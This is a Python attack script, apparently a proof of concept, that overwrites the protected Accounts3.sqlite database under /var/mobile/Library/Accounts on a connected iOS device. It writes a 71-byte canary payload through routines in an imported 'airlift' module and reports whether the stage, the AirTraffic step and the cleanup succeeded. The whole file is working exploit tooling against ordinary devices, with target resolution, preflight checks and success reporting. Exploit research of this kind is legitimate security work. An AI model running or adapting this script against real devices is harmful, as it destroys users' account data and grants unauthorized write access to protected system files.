#!/usr/bin/env python3
"""Accounts3.sqlite overwrite attack - no verification mode"""

from __future__ import annotations

import argparse
import hashlib
import json
import secrets
import sys
from pathlib import Path
from typing import Any

import airlift

ACCOUNTS_TARGET = "/var/mobile/Library/Accounts"
ACCOUNTS_SQLITE = "Accounts3.sqlite"
ACCOUNTS_FULL_PATH = f"{ACCOUNTS_TARGET}/{ACCOUNTS_SQLITE}"

CANARY_TEMPLATE = "aldazdev canary\nnonce={nonce}\n"


def generate_accounts_payload() -> tuple[bytes, str]:
    """Generate 71-byte payload"""
    nonce_bytes = secrets.token_bytes(24)
    nonce_hex = nonce_bytes.hex()
    canary_text = CANARY_TEMPLATE.format(nonce=nonce_hex)
    payload = canary_text.encode('utf-8')

    if len(payload) != 71:
        raise RuntimeError(f"Payload length error: {len(payload)} != 71")

    return payload, nonce_hex


def attack_accounts_no_verify(
    requested_device: str | None,
    *,
    verbose: bool,
    dry_run: bool = False,
    quiet: bool = False
) -> dict[str, Any]:
    """Execute Accounts3.sqlite overwrite attack (no verification)"""
    payload, nonce = generate_accounts_payload()

    if not quiet:
        print(f"[*] Payload: {len(payload)} bytes, nonce={nonce}", file=sys.stderr)
        print(f"[*] Target: {ACCOUNTS_FULL_PATH}", file=sys.stderr)

    if dry_run:
        return {
            "ok": True,
            "mode": "dry-run",
            "payloadLength": len(payload),
            "payloadSHA256": hashlib.sha256(payload).hexdigest(),
            "nonce": nonce,
            "targetPath": ACCOUNTS_FULL_PATH,
        }

    if not airlift.DEVICE_HELPER.is_file() or not airlift.AIRTRAFFIC_HOST.is_file():
        raise airlift.AirLiftError("Helpers not built; run make first")

    device = airlift.resolve_device(requested_device)
    udid = device["udid"]
    build = device["build"]

    if not quiet:
        print(f"[*] Device: {device['name']} ({device['model']}) iOS {device['version']}", file=sys.stderr)

    airlift.preflight(udid)

    if not quiet:
        print(f"[*] Executing attack...", file=sys.stderr)

    attack_result = airlift.attempt(
        udid,
        ACCOUNTS_TARGET,
        ACCOUNTS_SQLITE,
        payload,
        verbose=verbose
    )

    airlift.preflight(udid)

    stage_ok = attack_result.get("stageSucceeded", False)
    airtraffic_ok = attack_result.get("airTrafficSucceeded", False)
    cleanup_ok = attack_result.get("cleanupComplete", False)
    write_likely_successful = stage_ok and airtraffic_ok

    result = {
        "ok": write_likely_successful,
        "attackType": "accounts-sqlite-overwrite-no-verify",
        "device": {
            "product": device["product"],
            "version": device["version"],
            "build": build,
        },
        "targetPath": ACCOUNTS_FULL_PATH,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "nonce": nonce,
        "stageSucceeded": stage_ok,
        "airTrafficSucceeded": airtraffic_ok,
        "cleanupComplete": cleanup_ok,
    }

    if verbose:
        result["attack"] = attack_result

    if write_likely_successful:
        print(f"\n[SUCCESS] Attack completed", file=sys.stderr)
        if not quiet:
            print(f"  Stage: OK", file=sys.stderr)
            print(f"  AirTraffic: OK", file=sys.stderr)
            print(f"  Cleanup: {'OK' if cleanup_ok else 'PARTIAL'}", file=sys.stderr)
    else:
        print(f"\n[FAILED] Attack failed", file=sys.stderr)
        if not stage_ok:
            print(f"  Stage: FAILED", file=sys.stderr)
        if not airtraffic_ok:
            print(f"  AirTraffic: FAILED", file=sys.stderr)

    return result


def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--device", metavar="UDID", help="Target device UDID")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--dry-run", action="store_true", help="Generate payload only")
    parser.add_argument("--quiet", action="store_true", help="Minimal output")

    args = parser.parse_args()

    try:
        result = attack_accounts_no_verify(
            args.device,
            verbose=args.verbose,
            dry_run=args.dry_run,
            quiet=args.quiet
        )
    except (airlift.AirLiftError, OSError, Exception) as error:
        result = {"ok": False, "error": str(error)}
        if isinstance(error, airlift.AirLiftError) and error.details:
            result["diagnostics"] = error.details
        print(json.dumps(result, ensure_ascii=False, sort_keys=True))
        return 1

    if not args.quiet or args.verbose:
        print(json.dumps(result, indent=2, ensure_ascii=False, sort_keys=True))

    return 0 if result["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
